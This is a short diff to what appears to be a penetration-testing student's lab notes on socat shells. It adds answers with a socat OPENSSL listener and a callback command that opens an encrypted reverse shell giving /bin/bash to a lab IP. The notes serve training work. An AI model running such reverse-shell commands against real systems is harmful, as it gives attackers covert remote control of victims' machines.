@@ -21,7 +21,11 @@ connect
 `socat - OPENSSL:192.168.119.249:443,verify=0`
 ![[Pasted image 20220218122213.png]]
 3.  Create an encrypted bind shell on your Windows system. Try to connect to it from Kali without encryption. Does it still work?
-
+use previously generated .pem
+start socat listener
+`socat -d -d OPENSSL-LISTEN:443,cert=shell.pem,verify=0 STDOUT`
+target windows machine do a callback using socat
+`socat OPENSSL:192.168.119.218:443,verify=0 EXEC:/bin/bash`
 
 4.  Make an unencrypted **socat ** bind shell on your Windows system. Connect to the shell using Netcat. Does it work?
 
